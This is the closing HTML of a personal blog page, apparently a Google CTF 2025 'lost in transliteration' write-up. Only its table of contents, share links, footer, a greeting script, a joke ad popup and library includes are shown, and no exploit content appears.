+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BC%96%E7%A0%81%E8%A1%A8"><span class="toc-number">1.1.</span> <span class="toc-text">获取编码表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">2.</span> <span class="toc-text">构造payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%83%E9%80%B8%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-number">2.1.</span> <span class="toc-text">逃逸单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E5%8F%B3%E8%BE%B9%E5%BC%95%E5%8F%B7"><span class="toc-number">2.2.</span> <span class="toc-text">闭合右边引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E5%85%83%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%A4%84%E7%90%86tag"><span class="toc-number">2.3.</span> <span class="toc-text">三元表达式处理tag?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">2.4.</span> <span class="toc-text">模板字符串执行代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84payload"><span class="toc-number">2.5.</span> <span class="toc-text">最后的payload</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&text=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&title=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&is_video=false&description=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Googlectf2025-lost-in-transliteration-writeup&body=Check out this article: https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&title=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&title=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&title=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&title=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&name=Googlectf2025-lost-in-transliteration-writeup&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&t=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    le0n
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/friends">friends</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+<!--抽象小广告：-->
+<script>
+  // 根据时间动态设置问候语
+  function updateGreeting() {
+    const hour = new Date().getHours();
+    let greeting = "你好";
+
+    if (hour >= 5 && hour < 12) {
+      greeting = "早上好";
+    } else if (hour >= 12 && hour < 18) {
+      greeting = "下午好";
+    } else if (hour >= 18 && hour < 24) {
+      greeting = "傍晚好";
+    } else {
+      greeting = "深夜好";
+    }
+
+    const welcomeSpan = document.getElementById("greeting");
+    if (welcomeSpan) {
+      welcomeSpan.innerText = greeting;
+    }
+  }
+  document.addEventListener("DOMContentLoaded", function () {
+    updateGreeting();
+  });
+</script>
+<div id="fixLayout" style="width: 100%;"><div id="qz_notification" class="msg-channel-wrapper" style="right: 1px; z-index: 6500; width: 321px; position: fixed; bottom: 5px;">
+    <div class="msg-channel" data-itemid="2740651">
+      <div class="hd">
+        <p class="user-info">
+          <span id="greeting" class="welcome">傍晚好</span>
+          <span id="ip" class="name textoverflow">ctfer</span><a href="https://www.yuque.com/le0n/" target="_blank" title="点击查看ctf特权详情" class="qz_vip_icon_s qz_vip_icon_s_gray_1 "></a>            </p>
+
+      </div>
+      <div class="bd">
+        <!-- 整片可点击 -->
+        <a href="https://www.yuque.com/le0n/" target="_blank" data-hook="reportClick" class="inner clearfix">
+          <img src="https://tianshu.gtimg.cn/tianshu/1740386625176.gif" class="privilege-img" alt="游戏特权推广图">
+
+          <div class="privilege-content">
+            <h3 class="title">ctf霸业</h3>
+
+            <p class="desp">满屏光柱超变传奇</p>
+            <span class="btn-get" title="点击开始">点击开始</span>
+
+          </div>
+        </a>
+      </div>
+    </div>
+    <!-- 操作按钮 -->
+    <a class="op-icon icon-setting" data-hook="showSetup" href="javascript:void(0)" title="弹窗设置"></a>
+    <a class="op-icon icon-close" data-hook="closeTips" href="javascript:void(0)" title="关闭"></a>
+    <!-- 分割线 -->
+    <span class="op-icon-split"></span>
+
+    <!-- 浮层 -->
+    <div class="ui-dialog ui-light-dialog ui-light-dialog-s ui-popover ui-popover-top-right" id="qz_notification_config" style="display:none">
+      <div class="ui-dl-inner">
+        <b class="ui-dl-arrow ui-dl-arrow1"></b>
+        <b class="ui-dl-arrow ui-dl-arrow2"></b>
+
+        <div class="ui-dl-hd">
+          <div class="qz-grid">
+            <div class="qz-right"><a href="javascript:void(0);" data-hook="shutDown" class="close" title="关闭"><s class="ui-icon sp-dialog-close"></s></a></div>
+          </div>
+        </div>
+        <div class="ui-dl-bd">
+          <p class="j_qz_notification_config_select" data-hook="selectThis" data-index="0"><label for=""><input type="radio" name="show_mod" class="none" value="0"><i class="ui-icon qz-radio-on"></i>每日登录时自动显示一次</label></p>
+
+          <p class="j_qz_notification_config_select" data-hook="selectThis" data-index="1"><label for=""><input type="radio" name="show_mod" class="none" value="1"><i class="ui-icon qz-radio"></i>从不自动显示</label>
+          </p>
+        </div>
+        <div class="ui-dl-ft">
+          <div class="qz-grid">
+            <div class="qz-right actions">
+              <a class="qz-button qz-dark-button" data-hook="sendOk" href="javascript:void(0);"><span class="txt">确定</span></a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div></div></div>
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
